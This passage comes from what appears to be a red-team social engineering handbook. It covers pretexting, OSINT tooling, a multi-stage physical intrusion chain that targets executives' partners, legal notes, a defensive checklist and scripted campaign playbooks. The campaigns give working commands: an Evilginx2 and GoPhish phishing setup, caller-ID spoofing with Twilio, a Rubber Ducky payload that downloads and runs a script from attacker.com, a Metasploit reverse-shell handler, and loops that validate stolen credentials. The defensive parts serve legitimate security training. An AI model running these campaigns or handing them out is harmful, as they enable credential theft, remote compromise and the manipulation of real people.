- Replace all 125kHz legacy systems with MIFARE DESFire EV2/EV3 (AES-128, mutual authentication) or SEOS
- Implement card + PIN (two-factor) on high-security doors — card clone alone doesn't give access
- Monitor access logs for unusual patterns (employee card used when employee is known to be away, access at unusual hours)
- Anti-skimming sleeves for employee badges — reduce passive read range
- Audit for "ghost credentials" — cloned cards that aren't in your system but open doors

**Sub-GHz RF:**
- Replace fixed-code systems with rolling-code (KeeLoq or AES-based rolling code)
- For high-security gates: use app-based access (TLS-encrypted) instead of RF remote
- Detect: RF spectrum monitoring near perimeter — anomalous transmissions on 433MHz indicate capture attempt
- Frequency hopping systems are significantly more resistant to replay

---

## 8. Pretexting & Impersonation

### 8.1 What it is
Building a believable false identity or scenario to lower the target's guard before executing any of the above vectors. The pretext is the story. The vector is the delivery.

### 8.2 Building a pretext from OSINT

Automated OSINT and web reconnaissance feeds pretext quality:

| OSINT finding | Pretext use |
|--------------|-------------|
| Employee names (user enumeration) | Address target by name — creates familiarity |
| Email format (git history analysis) | Craft convincing sender address |
| Internal credential in git history | Impersonate specific internal teams credibly |
| Tech stack (headers, API docs) | Reference real systems the target uses |
| Vendor names (job listings, LinkedIn) | Impersonate known suppliers |
| Org chart (LinkedIn OSINT) | Reference manager names to create authority |

Automated OSINT compiles pretext hooks cross-referenced with role and credential source.

### 8.3 Pretext archetypes

**Authority:** IT admin, C-suite, government, auditor — compliance pressure
**Urgency:** Account breach, payment overdue, access expiring — time pressure
**Familiarity:** Internal colleague, shared vendor, mutual contact — trust
**Fear:** Legal action, account suspension, security incident — anxiety

Most effective pretexts combine at least two of these.

### 8.4 Recognize it
- Unexpected contact from authority figure — verify via separate channel
- Request for credentials or sensitive info — legitimate authorities don't ask for this
- Pressure to act immediately — slow down, it's manufactured
- Caller/sender knows details about you — OSINT doesn't equal legitimacy

---

## 9. OSINT as the Foundation

### 9.1 Why OSINT matters

Before automated OSINT: scanners harvested usernames, emails, roles, git history, employee directories. None of it fed SE vectors — found and discarded.

With proper OSINT integration: reconnaissance output flows directly into campaign planning. Every finding that has a human attached to it is SE surface.

### 9.2 What your web scanner finds

| Scan type | SE-relevant output |
|-------|-------------------|
| Git history analysis | Internal usernames, email patterns, credentials in history |
| Credential testing | Confirmed valid username/password pairs |
| User enumeration | Full user list with roles and emails |
| Legacy API probing | Legacy user data, old credentials |
| API endpoint exploration | Email fields, user objects, internal API structure |
| SE recon checks | Enumeration vectors, open redirects, email injection points |

### 9.3 OSINT Tools

**theHarvester** — email, subdomain, and employee name harvester (Kali built-in)
```bash
theHarvester -d target.com -b all -l 500
# -d: target domain
# -b: data sources (google, bing, linkedin, github, hunter, etc.)
# -l: result limit per source
# Output: emails, subdomains, IPs, employee names

# LinkedIn specifically:
theHarvester -d target.com -b linkedin -l 200
# Returns LinkedIn profile names associated with the domain

# Write to file:
theHarvester -d target.com -b all -f /tmp/harvest_output.html
```

**Recon-ng** — modular OSINT framework (Kali built-in)
```bash
recon-ng
> marketplace install all   # install all modules
> workspaces create target.com
> db insert domains --domain target.com

# Email harvesting:
> modules load recon/domains-contacts/whois_pocs
> run

# LinkedIn scraping:
> modules load recon/profiles-contacts/linkedin_auth
> options set CREDENTIALS your_linkedin_creds
> run

# People → email address format:
> modules load recon/contacts-credentials/hibp_breach_search
> run
```

**SpiderFoot** — automated OSINT (web UI or CLI)
```bash
# Install (if not on Kali):
pip3 install spiderfoot
# Or: git clone https://github.com/smicallef/spiderfoot

# Run web UI:
python3 sf.py -l 127.0.0.1:5001
# Access at http://127.0.0.1:5001

# CLI scan:
python3 sfcli.py -s target.com -t INTERNET_NAME -m sfp_email,sfp_linkedin,sfp_pgp
```

**Hunter.io** — email address finder + format verifier (API)
```bash
# Domain search (find all emails for a domain):
curl "https://api.hunter.io/v2/domain-search?domain=target.com&api_key=YOUR_KEY"

# Email finder (guess format from name):
curl "https://api.hunter.io/v2/email-finder?domain=target.com&first_name=john&last_name=smith&api_key=YOUR_KEY"

# Email verifier:
curl "https://api.hunter.io/v2/email-verifier?email=john@target.com&api_key=YOUR_KEY"
# Free tier: 25 requests/month — enough for targeted work
```

**Maltego** — visual link analysis (commercial, community edition available)
- Download: maltego.com → Community Edition (free, limited API calls)
- Use: visualise relationships between targets, emails, domains, social profiles
- Transforms: built-in for Shodan, VirusTotal, HaveIBeenPwned, social media
- Best for: mapping org chart, finding connected infrastructure, visualising APSE target network

**Shodan** — internet-wide port/service scanner
```bash
# Install CLI: pip3 install shodan
shodan init YOUR_API_KEY

# Search for target infrastructure:
shodan search hostname:target.com
shodan search org:"Target Company Ltd"

# Get details on specific IP:
shodan host 1.2.3.4

# Email-format intelligence from cert:
shodan search ssl.cert.subject.email:@target.com
```

**LinkedIn (manual OSINT)**
- Search: site:linkedin.com/in "target company" → finds employee profiles without needing a connection
- Sales Navigator (paid): org chart, role filtering, email format inference
- Key data points: full name, job title, tenure, manager chain, recent activity, mutual connections
- All feeds into: pretext quality (vishing targets, pretext hooks compiled in reconnaissance output)

### 9.4 The yield

OSINT yield isn't measured in raw findings. It's measured in pretext quality. A username is a finding. A username + email + role + manager name + known vendor = a convincing vishing pretext. The data compounds.

---

## 10. Advanced Persistent SE — Multi-Stage Physical + Digital Chains

### 10.1 What it is

Advanced Persistent SE (APSE) is the long-form con. Not a single email or a single call — a multi-stage campaign that can run for weeks or months, combining digital reconnaissance, physical presence, relationship building, hardware implantation, and loot retrieval into a single chained operation.

Each stage yields intelligence or access that unlocks the next stage. The attacker invests time upfront to dramatically reduce the technical difficulty of later stages. By the time a device is touched, the attacker is already trusted.

This is documented because it happens to real executives and their families in the real world. Corporate espionage, nation-state targeting, and high-value criminal operations all use these chains. Defenders need to recognise what it looks like from the inside — before the USB goes in.

---

### 10.2 The Kill Chain

```
Stage 0: Target Selection (OSINT)
  ↓
Stage 1: Adjacent Target Identification
  ↓
Stage 2: Presence Establishment
  ↓
Stage 3: Rapport Building
  ↓
Stage 4: Physical Access Opportunity
  ↓
Stage 5: Implant / Loot Drop
  ↓
Stage 6: Loot Accumulation (passive, remote)
  ↓
Stage 7: Retrieval Pretext
  ↓
Stage 8: Device Recovery + Exfiltration
```

Each node is a decision point. The chain only advances when the current stage is solid. Rushing any stage collapses the operation.

---

### 10.3 Stage 0 — Target Selection (OSINT)

**What the attacker does:**
Maps the target organization to identify the highest-value individuals and their exposed personal surface.

Sources:
- LinkedIn: org chart, exec names, roles, tenure, mutual connections
- Company website: leadership page, team photos, press releases
- Companies House / ASIC / SEC filings: director names, addresses
- Social media: Facebook, Instagram — personal life, location patterns, interests, family
- Google: news articles, conference appearances, speaking engagements
- Automated web reconnaissance output: confirmed usernames, roles, email patterns from the app itself

Output: **target profile** — name, role, home suburb, interests, partner/family info, social circle, daily patterns, known locations (gym, coffee shop, school run).

**What it looks like from the target's perspective:** Nothing. This is entirely passive. No contact made.

**Where it can be broken:** Minimize personal information exposure on social media. LinkedIn privacy settings. Executives should be aware their personal life is a professional attack surface.

---

### 10.4 Stage 1 — Adjacent Target Identification

**What the attacker does:**
Identifies people close to the primary target who have less security awareness but provide a path to access. Partners, family members, personal assistants, close colleagues, gym friends, neighbours.

The adjacent target is chosen because:
- They have lower security awareness than the primary target
- They have physical access to the primary target's home or devices
- They are socially connected in ways that create natural introduction opportunities
- Compromising them doesn't trigger the primary target's professional threat awareness

Classic example: exec's partner. High social trust, lower corporate security training, has access to home office, home network, shared devices. Befriending the partner never triggers the exec's professional guard.

**What it looks like from the target's perspective:** Nothing yet. Research only.

**Where it can be broken:** Executives should brief partners on the fact that they are an attack surface. Not to create paranoia — to create awareness. "If someone new seems very interested in where I work or what I do, mention it to me."

---

### 10.5 Stage 2 — Presence Establishment

**What the attacker does:**
Physically enters the adjacent target's social environment. Joins the gym. Attends the same community events. Frequents the same coffee shop at the same time. Volunteers at the same school. Appears organically in the same spaces.

This takes time. The attacker is investing weeks of consistent presence to become a familiar face before any contact is made. Familiarity breeds trust — the brain categorises known faces as safe.

Key principles:
- No rushed introduction — let natural encounter happen
- Shared interest is the hook (gym equipment, coffee order, school pickup small talk)
- Consistency is critical — irregular presence is noticed and remembered as strange
- The attacker has a backstory prepared and consistent across all interactions

**What it looks like from the target's perspective:** A friendly person they keep seeing around. Nothing unusual.

**Where it can be broken:** Extremely difficult at this stage. Awareness that this vector exists is the primary defence. Security-conscious individuals notice patterns — new person, unexpectedly high interest in your life, shows up in multiple contexts.

---

### 10.6 Stage 3 — Rapport Building

**What the attacker does:**
Converts familiarity into friendship. Progresses contact from nodding acknowledgement → casual conversation → exchanging numbers → social plans.

Techniques:
- **Reciprocity:** small favours create obligation — spot the target at the gym, offer to watch their bag, pay for their coffee
- **Mirroring:** subtly match body language, speech patterns, vocabulary — creates unconscious affinity
- **Shared vulnerability:** controlled personal disclosure builds intimacy — "I'm going through a tough time at work too" creates bond
- **Interest alignment:** the attacker has researched the adjacent target's interests and positions themselves as sharing them authentically
- **Time investment:** genuine repeated positive interactions over weeks — cannot be faked quickly

The adjacent target now considers the attacker a friend. Social invitations follow naturally — gym sessions together, coffee, eventually social events including the primary target.

**What it looks like from the target's perspective:** A new friendship that developed naturally over time. This is the hardest stage to detect because at this point the attacker has done nothing wrong. There is no technical indicator. The only signal is the attacker's interest level and pace of relationship development — slightly faster than normal friendship timelines.

**Where it can be broken:** Trust your instincts. New friendships that move unusually fast, new people who seem intensely interested in your partner's professional life, unexpected curiosity about your home setup, work devices, or daily routines.

---

### 10.7 Stage 4 — Physical Access Opportunity

**What the attacker does:**
Manoeuvres into a position where they have unsupervised or semi-supervised access to the primary target's devices or premises.

Vectors:
- **Social event at target's home:** BBQ, dinner party, gathering — attacker is invited as adjacent target's friend. Primary target is the host — distracted, moving between guests. Home office, laptop, router are accessible.
- **Dropping something off / picking something up:** attacker creates an errand that gets them inside the home briefly
- **Offering to help:** carry something, fix something, set up the new TV — creates supervised but distracted access
- **Working nearby:** coffee shop "coincidence" where attacker sits near primary target working on laptop

The attacker is not rushing. They may attend multiple social events, building comfort and familiarity with the physical layout, before any implant is placed.

**What it looks like from the target's perspective:** Friend of partner at a social event. Nothing unusual. This is the last moment where intuition might fire — something slightly off about the person, slightly too interested in the home office area.

**Where it can be broken:**
- Home office physically separated and locked during social events
- Work devices never left unattended during social events, even at home
- Router / network equipment in a non-guest-accessible location
- Trust your instincts about guests — if someone seems to be casing the room rather than socialising, notice it

---

### 10.8 Stage 5 — Implant / Loot Drop

**What the attacker does:**
30 seconds. Maximum. Places hardware implant on or near target device.

Options:
- **USB keylogger** plugged into back of desktop between keyboard and USB port — invisible from normal working position. Logs every keystroke. Stores locally until retrieved.
- **O.MG Cable / malicious charging cable** left "accidentally" near target's desk — target uses it to charge phone or connect device. Cable has embedded microcontroller. Exfiltrates or executes on connection.
- **USB drop (BadUSB)** inserted into port on unattended laptop — executes payload immediately (reverse shell, credential dump, persistence mechanism). Device removed. Payload remains.
- **Rogue access point** — small device plugged into ethernet port or power outlet. Creates evil twin network. Captures traffic from devices that connect.
- **Acoustic / visual bug** — outside scope of digital SE but documented for completeness. Requires physical placement and recovery.

The implant is placed in the moment — a brief distraction, the host moving to the kitchen, stepping outside to take a call. The attacker knows the layout from previous visits. The motion is practiced and natural.

**What it looks like from the target's perspective:** Nothing. A USB keylogger on the back of a desktop is invisible in normal use. A cable left near the desk looks like clutter. A small device behind a power strip is furniture.

**Where it can be broken:**
- Physical inspection of ports and cables — periodic, not just when something goes wrong
- USB device control via MDM (only whitelisted devices connect)
- Network monitoring — new device on network triggers alert
- Locked/closed home office during any visitor access
- No unknown USB devices or cables ever connected — policy enforced

---

### 10.9 Stage 6 — Loot Accumulation

**What the attacker does:**
Nothing active. The implant works autonomously.

USB keylogger stores keystrokes to internal memory — credentials, passwords typed into banking sites, work VPN logins, email passwords, private messages. Everything typed on that keyboard, silently captured.

O.MG Cable with WiFi exfiltration: attacker receives keystrokes in near-real-time to a remote endpoint. No retrieval required.

Rogue AP: captures unencrypted traffic and credentials from HTTP sites or misconfigured apps.

Duration: days to weeks. The longer the implant sits, the more complete the credential picture. The attacker waits until they have what they need or until it's time to retrieve before the device is discovered.

**What it looks like from the target's perspective:** Nothing. Normal computer use. No slowdown, no unusual behaviour, no indication.

**Where it can be broken:**
- Periodic physical port inspection catches keyloggers
- EDR on endpoint detects keylogger driver installation (software keyloggers — not applicable to hardware)
- Network monitoring catches unexpected outbound connections (WiFi-exfiltrating implants)
- Hardware keyloggers have no software footprint — physical inspection only

---

### 10.10 Stage 7 — Retrieval Pretext

**What the attacker does:**
Creates a natural reason to return and recover the implant.

Classic vectors:
- **Left item:** cap, jacket, charger, book — "I think I left my [item] at yours last time" — gets invited back to collect it
- **Social follow-up:** another event at the same location — attacker is invited again as adjacent target's friend
- **Favour:** offering to help with something that requires a return visit — "I'll bring that thing I mentioned"
- **WiFi-exfiltrating implant:** no retrieval needed — attacker collects data remotely, may leave device indefinitely or never return

The retrieval visit looks identical to the initial access visit. Same social context, same access level. The attacker retrieves the device during a brief unobserved moment — same 30 seconds as placement.

**What it looks like from the target's perspective:** Friend returning to collect a forgotten item. Completely normal social interaction.

**Where it can be broken:** If the implant was detected between visits, law enforcement involvement is the appropriate response at this point.

---

### 10.11 Stage 8 — Exfiltration

**What the attacker does:**
Extracts stored loot from the recovered hardware device. Keylogger dumps to file — attacker parses for credentials, passwords, PINs, private communications. Cross-references with known accounts (email, banking, work VPN, corporate systems). Tests credentials. Achieves the original objective — access to corporate systems, financial accounts, or sensitive information.

The digital chain then continues: valid credentials → corporate network access → lateral movement → data exfiltration → ransomware → whatever the original objective was.

The entire physical chain was the bypass around technical security controls. No phishing filter. No MFA prompt on a login page. No network monitoring alert. The credentials were captured at the source — the keyboard — before any security layer had a chance to inspect them.

---

### 10.12 Chain Variations

**Shorter chains — target of opportunity:**
Not every APSE operation requires weeks of rapport building. Opportunistic variants:
- Conference / trade show: strike up conversation with exec at networking event, offer a charge from your power bank (O.MG cable), swap business cards, disappear
- Shared workspace / coworking: sit near target over several days, establish familiarity, brief device access during bathroom break
- Hotel / airport: target working on laptop in public, shoulder surfing for credentials, or brief unattended device moment

**Longer chains — high-value target:**
Nation-state level operations have run APSE chains over 12-18 months. The investment scales with the value of the objective. A single set of C-suite credentials with MFA bypass might be worth 6 months of groundwork to the right actor.

**Digital-only chains:**
The physical element is not always required. Fully digital APSE:
- LinkedIn connection → rapport via messaging → job offer pretext → malicious document in "application materials" → corporate network access
- Twitter/X DM relationship → months of engagement → "can you review this file for me?" → payload executed
- Discord server infiltration → build reputation as legitimate member over weeks → trusted enough to send links that get clicked

**The common thread:** time investment upfront → trust established → single moment of exploitation → full access.

---

### 10.13 Defensive Summary for APSE

| Stage | Attack action | Defensive control |
|-------|--------------|-------------------|
| 0 — OSINT | Passive research | Minimize personal info exposure. LinkedIn privacy. Brief family on threat. |
| 1 — Adjacent target | Partner/family identified as vector | Family awareness. "Tell me about new friends who ask about my work." |
| 2 — Presence | Attacker enters social environment | Pattern recognition. New person appearing in multiple contexts. |
| 3 — Rapport | Friendship built | Trust instincts. Unusually fast relationships. High interest in professional life. |
| 4 — Physical access | Social event, home access | Lock home office. No unattended work devices at social events. |
| 5 — Implant | USB keylogger, malicious cable | Physical port inspection. USB device control. No unknown cables. |
| 6 — Accumulation | Passive keystroke capture | Network monitoring. Periodic physical inspection. EDR. |
| 7 — Retrieval | Return visit pretext | Awareness. If device found — law enforcement, not confrontation. |
| 8 — Exfiltration | Credentials used | MFA everywhere. Credential monitoring (HaveIBeenPwned). Anomalous login alerts. |

**The single most effective control:** MFA. Even with a full set of captured credentials, MFA forces the attacker to either also capture the MFA device (significant additional complexity) or find an MFA bypass. It doesn't make APSE impossible — it raises the cost substantially.

**The second most effective control:** Physical security culture. A locked home office and a policy of never leaving work devices unattended in the presence of non-vetted guests eliminates the implant opportunity entirely, regardless of how much groundwork the attacker has done.

---

## 11. Legal & Authorization

### 11.1 Authorization requirements

Every technique in this handbook requires:
1. Written authorization from an authorized representative of the target organization
2. Defined scope: which users can be targeted, which vectors are permitted
3. Defined timeframe: start date, end date, out-of-hours restrictions
4. Emergency contact: who to call if something goes wrong
5. Rules of engagement: what happens if a target reports the attempt

The scope doc format is the same as a pentest scope doc. Apply it to SE vectors.

### 11.2 Jurisdiction reference

| Jurisdiction | Relevant law |
|-------------|-------------|
| UK | Computer Misuse Act 1990, Fraud Act 2006 |
| Australia | Criminal Code Act 1995, Part 10.7 |
| USA | CFAA 18 U.S.C. § 1030, CAN-SPAM Act |
| EU | Directive on Attacks Against Information Systems |

Unauthorized SE techniques are criminal offences. Written authorization is not optional.

### 11.3 This document

This handbook documents techniques for two purposes:
1. Authorized security testing — proving attack surface exists so it can be fixed
2. Defensive awareness — recognizing and avoiding these attacks in the real world

It does not endorse unauthorized use of any technique described herein.

---

## 12. Defensive Checklist

### Technical controls
- [ ] SPF, DKIM, DMARC configured on all email domains
- [ ] Open redirects patched (validate and whitelist redirect destinations)
- [ ] Login error messages normalized (same message for valid/invalid user)
- [ ] Password reset responses normalized (no user enumeration oracle)
- [ ] USB device control via MDM/GPO (whitelist only)
- [ ] Autorun disabled on all endpoints
- [ ] MFA enforced on all accounts
- [ ] HTTPS + HSTS on all web properties
- [ ] EDR deployed and monitored

### Process controls
- [ ] Security awareness training — annually minimum, phishing simulation quarterly
- [ ] Policy: never give credentials over the phone
- [ ] Policy: verify unexpected requests via separate channel (call back on known number)
- [ ] Policy: report suspicious contact to security team without fear of blame
- [ ] Incident response plan includes SE scenarios

### Measurement (authorized testing only)
- SE-series flags in target application: all should fire on a clean authorized run
- Reconnaissance output file: should be complete with confirmed users, open redirects, pretext hooks
- Email phishing proof (v2): mechanical — link works, credentials captured
- Vishing proof (v2): call connects, script delivered
- Human click/submission rate: real engagement only, unknowing targets under authorized scope

---

## 13. Campaign Chains — Full-Scope Engagement Sequences

This section shows how the individual tool sections (1–10) chain together into complete, end-to-end social engineering campaigns. Each campaign type maps OSINT → pretext → delivery → exploitation → exfiltration as an unbroken sequence with real commands at each stage.

Use these as playbook templates. Adapt based on target scope and authorization.

---

### 13.1 Campaign A — Credential Phishing (Email Entry Point)

**Goal:** Harvest credentials for internal systems via phishing email + cloned login portal.
**Duration:** 2–5 days. **Applies to:** External engagements with email in scope.

#### Stage 0 — OSINT (Day 1)

Identify targets, email format, and internal system names.

```bash
# Harvest email addresses
theHarvester -d target.com -b all -l 500 -f loot/emails.html

# Confirm format (first.last@ or f.last@ etc.)
hunter.io — Verify format via API or browser: hunter.io/domain-search?domain=target.com

# Find internal system names (login portals, SSO, VPN)
# from certificates, job ads, LinkedIn, Shodan
shodan search "org:\"Target Corp\" http.title:\"Sign In\""
# Record: portal hostname, login field names, logo, colour scheme

# Recon-ng full pass
recon-ng -w target
[recon-ng][target] > modules load recon/domains-contacts/whois_pocs
[recon-ng][target] > run
[recon-ng][target] > modules load recon/domains-hosts/certificate_transparency
[recon-ng][target] > run
[recon-ng][target] > show hosts
```

**Yield:** 20–200 email addresses, confirmed email format, 1–3 portal hostnames.

#### Stage 1 — Infrastructure Prep (Day 1–2)

```bash
# Register lookalike domain (manual — choose based on target)
# Options: target-portal.com | targetcorp-it.com | target-helpdesk.com
# Register via Namecheap/Porkbun — pay anonymously if in scope

# Set up Evilginx2 (credential capture with real portal proxy)
evilginx2 -p /usr/share/evilginx2/phishlets
: config domain evilginx.attacker.com
: config ip 10.0.0.1

# Configure phishlet for target portal type
# Built-in phishlets: o365, google, linkedin, github, okta
: phishlets hostname o365 login.target-corp.com
: phishlets enable o365
: lures create o365
: lures get-url 1
# → https://login.target-corp.com/a1B2c3D4 (send this URL in email)

# OR: SET cloned portal (simpler, no MitM — gets credentials only)
setoolkit
→ 1) Social-Engineering Attacks
→ 2) Website Attack Vectors
→ 3) Credential Harvester Attack Method
→ 2) Site Cloner
→ URL to clone: https://intranet.target.com/login
→ IP for POST capture: 10.0.0.1
```

#### Stage 2 — Email Delivery (Day 2–3)

```bash
# GoPhish campaign setup
gophish &  # starts on :3333 + API on :3380

# Via API: create campaign
curl -X POST http://127.0.0.1:3380/api/campaigns/ \
  -H "Authorization: $(cat gophish_api_key)" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Target Corp IT Creds",
    "template": {"name": "IT Password Reset"},
    "url": "https://login.target-corp.com",
    "page": {"name": "Target Login Clone"},
    "smtp": {"name": "SendGrid Relay"},
    "groups": [{"name": "Target All Staff"}],
    "launch_date": "2026-03-10T09:00:00+10:30"
  }'

# Email template — make it contextually real
Subject: [ACTION REQUIRED] Password expires in 24 hours — IT Security
Body:
  Your network password expires tomorrow. Reset it now to avoid account lockout.
  Reset here: {tracking_url}   ← GoPhish injects the Evilginx URL
  IT Help Desk | Target Corp
```

#### Stage 3 — Capture & Validate (Day 3–5)

```bash
# Monitor Evilginx2 for captured sessions
: sessions
# → shows captured username:password + session token (for SSO bypass)
: sessions 1
# → full session dump including auth cookies

# OR GoPhish credential harvest view
curl http://127.0.0.1:3380/api/campaigns/1/results \
  -H "Authorization: $(cat gophish_api_key)" | jq '.results[] | select(.status=="Submitted Data")'

# Validate credentials immediately
curl -s -X POST https://intranet.target.com/login \
  -d 'username=j.smith&password=captured_password' -L -I | head -5
# HTTP/2 302 to /dashboard → valid
```

#### Stage 4 — Report

Document: email addresses harvested, click rate (%), submission rate (%), credentials captured, systems accessible. Map credentials to internal systems found in Stage 0.

---

### 13.2 Campaign B — Vishing + Credential Hand-Off

**Goal:** Call targets, build rapport over phone, obtain credentials or trigger password reset.
**Duration:** 1–3 days. **Applies to:** Engagements with phone-based SE in scope.

#### Stage 0 — OSINT (Day 1)

```bash
# Target identification — find helpdesk staff or IT team
# LinkedIn: search "Target Corp IT helpdesk" / "Target Corp sysadmin"
# Record: names, roles, direct numbers if visible

# theHarvester for phone/directory leaks
theHarvester -d target.com -b bing,linkedin -l 200

# Confirm internal IT processes
# Job ads: "We use ServiceNow" / "Okta SSO" / "Active Directory"
# This tells you the scripts the helpdesk actually uses

# Cross-reference your recon notes (see Section 13.5) for confirmed users and pretext hooks
```

#### Stage 1 — Pretext Build

Select pretext from your recon notes (leaked creds, confirmed roles, internal tech stack) or from these archetypes:

| Pretext | Use when | Script tone |
|---------|----------|-------------|
| New employee, first day | Target has onboarding flow | Confused, polite |
| IT audit — verify access | Target has compliance processes | Authoritative |
| Manager locked out, urgent | Target respects seniority | Urgent, slightly impatient |
| Vendor on-site, need WiFi | Target has visitor policies | Friendly, inconvenienced |
| Security team, MFA reset | Target has security-aware staff | Professional, procedural |

```bash
# Spoof caller ID to appear as internal extension or known vendor
# Twilio with number masking:
pip install twilio
python3 - <<'EOF'
from twilio.rest import Client
client = Client("ACXXXXXXXX", "auth_token")
call = client.calls.create(
    twiml='<Response><Say voice="alice">Hello, this is IT Support. Can you verify your employee ID?</Say></Response>',
    to="+61400000000",         # target
    from_="+61388888888"       # spoofed internal/vendor number
)
print(call.sid)
EOF
```

#### Stage 2 — The Call

**Do not rush.** Build rapport for 60–90 seconds before any ask.

Call flow:
1. Introduce with pretext name + role
2. Reference something specific — "I can see your account was flagged yesterday" (generic enough to land)
3. Establish urgency or authority — "We need to verify before the system rolls over tonight"
4. Ask for account username first — easier than password, builds compliance momentum
5. Ask for password OR steer to self-reset ("I'll send you a reset link, can you confirm your recovery email?")
6. If MFA: "I'll need you to read me the code that just came through" — works on compliant targets

**Abort triggers:** target sounds suspicious, asks to call back, mentions security policy. Hang up cleanly — "No worries, we'll sort it another way."

#### Stage 3 — Validate & Document

```bash
# Validate immediately after call
curl -s -X POST https://intranet.target.com/login \
  -d "username=$USERNAME&password=$PASSWORD" -L -I | head -3

# Log to loot
echo "$USERNAME:$PASSWORD  # vishing $(date -u +%Y-%m-%d)" >> loot/valid_credentials.txt
```

---

### 13.3 Campaign C — USB Drop (Physical Delivery)

**Goal:** Get a payload executed by a target employee via dropped USB device.
**Duration:** 1 day on-site. **Applies to:** Physical scope, on-site authorized.

#### Stage 0 — Recon

```bash
# Confirm OS via OSINT (job ads, LinkedIn tech stack, Shodan)
# Windows shops: HID attack (Rubber Ducky / O.MG Cable) — best ROI
# Linux/Mac: Autorun won't fire — rely on curiosity (interesting filenames)

# Select drop zone from your recon notes (site visit, Google Maps, LinkedIn, job ads)
# Best options: carpark, reception, canteen, printer trays, conference rooms
```

#### Stage 1 — Payload Build

```bash
# HID attack (USB Rubber Ducky — Windows target)
# ducky script: opens PowerShell, downloads + runs beacon
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "iex(iwr https://attacker.com/p.ps1 -UseBasicParsing)"
ENTER

# Compile with duckencoder
java -jar duckencoder.jar -i payload.txt -o inject.bin

# Flash to Rubber Ducky / Hak5 / compatible device

# Lure files on USB (for non-autorun curiosity drive)
# Create realistic-looking filenames
touch "CONFIDENTIAL_Salaries_2026.xlsx"
touch "IT_Passwords_DO_NOT_SHARE.docx"
touch "Redundancy_List_March_2026.pdf"
# These are lure names only — actual payload in hidden autorun or .lnk shortcut
```

#### Stage 2 — Drop

Drop zones ranked by success rate (authorized physical testing only):

1. **Carpark near entrance** — targets pick up and bring inside (curiosity > policy)
2. **Reception desk** — "someone left this" — receptionist plugs it in to find owner
3. **Printer paper tray** — blends in, found by anyone printing
4. **Canteen/break room** — relaxed environment, guard down
5. **Conference room** — during gap between meetings

Label USB with: `IT DEPT — DO NOT REMOVE` or `[Target Name] — PROPERTY OF [Company]`

#### Stage 3 — Confirm Execution

```bash
# Monitor C2 for beacon callback
# Cobalt Strike: open Listeners → watch for new sessions
# Metasploit: msfconsole → use multi/handler → run → wait for reverse shell
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST attacker.com
set LPORT 443
run

# OR monitor DNS for beacon
tcpdump -i eth0 -n 'udp port 53' | grep attacker.com
```

---

### 13.4 Campaign D — Full-Scope Chain (OSINT → Phish → Vishing → Physical)

**Goal:** Maximum-depth engagement combining all vectors. Used when breadth of compromise is the objective.
**Duration:** 5–10 days.

This is the APSE framework from Section 10 executed as a complete engagement. The difference: here we show the exact tool sequence and handoff points.

```
Day 1–2:  OSINT sweep ─────────────────────────────────────────────────────┐
           theHarvester → Recon-ng → Shodan → notes (Section 13.5)          │
           Output: confirmed_users, email format, portal URLs, org chart     │
                                                                              ↓
Day 2–3:  Phishing wave (Section 13.1) ───────────────────────────────────┐ │
           Evilginx2 portal clone → GoPhish campaign                        │ │
           Target: 20–50 staff                                               │ │
           Output: 5–15% click rate, 1–5 credential pairs                   │ │
                                                                              ↓ ↓
Day 3–4:  Vishing follow-up on non-clickers (Section 13.2) ──────────────┐  │
           Call HR/helpdesk → social-proof phish ("did you get our email?")  │  │
           Leverage phishing click data: "I can see you opened it but        │  │
           didn't complete the form — can we do it over the phone?"          │  │
           Output: 1–3 additional credentials, MFA codes                     │  │
                                                                              ↓  │
Day 4–5:  Physical access (if in scope) (Section 13.3) ─────────────────┐  │  │
           USB drop + on-site pretext                                        │  │  │
           Leverage credential from Day 2–3: badge clone from Proxmark3      │  │  │
           + HID attack payload for local access                             │  │  │
                                                                              ↓  ↓  ↓
Day 5–10: Consolidation ──────────────────────────────────────────────────────────┘
           Validate all credentials across all portals
           Map access: VPN / email / Jira / GitHub / AWS console
           Document compromise path: which vector → which credential → which access
```

**Handoff points — critical to get right:**

| From | To | Data passed |
|------|----|-------------|
| OSINT sweep | Phishing | Email list, portal URLs, org chart |
| Phishing results | Vishing | Non-clicker list, subject line that worked |
| Vishing results | Physical | Staff names, floor/desk locations from conversation |
| Physical implant | Consolidation | Beacon callback, local network map |

```bash
# Consolidation script — validate all captured creds across all portals
while IFS=: read user pass; do
  for portal in "https://vpn.target.com/login" "https://mail.target.com" "https://jira.target.com"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$portal" \
      -d "username=$user&password=$pass" -L --max-redirs 3)
    echo "$portal | $user:$pass | HTTP $status"
  done
done < loot/valid_credentials.txt
```

---

### 13.5 Campaign E — Extracting SE Intelligence from Standard Recon

**Goal:** Pull SE-relevant intelligence from the recon you're already doing — so it feeds campaigns A–D.
**Duration:** 2–4 hours. Run at the start of every engagement before planning delivery.

Standard recon tools surface SE-relevant intelligence that most testers walk past. This section shows what to look for, how to extract it, and what campaign each finding feeds.

#### What to collect

| Intelligence | Where it comes from | Campaign use |
|---|---|---|
| Email addresses | theHarvester, LinkedIn, job ads | Phishing target list (Campaign A) |
| Confirmed usernames | Login response timing/wording differences | Vishing call list (Campaign B) |
| Staff names + roles | LinkedIn, company website, email signatures | Pretext selection — match role to angle |
| Internal tech stack | Job ads ("must know ServiceNow"), Shodan, cert names | Helpdesk impersonation scripts |
| Leaked credentials | Git history, exposed config files, Pastebin | Instant credibility in vishing calls |
| Open redirects | Manual URL parameter testing | Phishing URL that survives email filters |
| Email injection points | Contact/support forms | Send phishing from target's own mail server |
| Physical layout | Google Maps, LinkedIn check-ins, job ads mentioning offices | USB drop zone selection (Campaign C) |

#### How to collect it

```bash
# Email harvest — theHarvester
theHarvester -d target.com -b all -l 500 -f emails.html
grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' emails.html | sort -u > emails.txt

# Username enumeration — timing or wording oracle at login
for user in admin administrator info support helpdesk it finance hr; do
  resp=$(curl -s -X POST https://target.com/login \
    -d "username=$user&password=invalid" -w "\n%{http_code}")
  echo "$user → $resp"
done
# Same HTTP code but different body text ("invalid username" vs "invalid password") = confirmed user

# Git history credential leak — git-dumper
git-dumper https://target.com/.git git_dump/
git -C git_dump log -p --all | grep -i "password\|secret\|key\|token" | head -30

# Open redirect — common parameter names
for param in next redirect return url callback goto; do
  location=$(curl -s -o /dev/null -w "%{redirect_url}" \
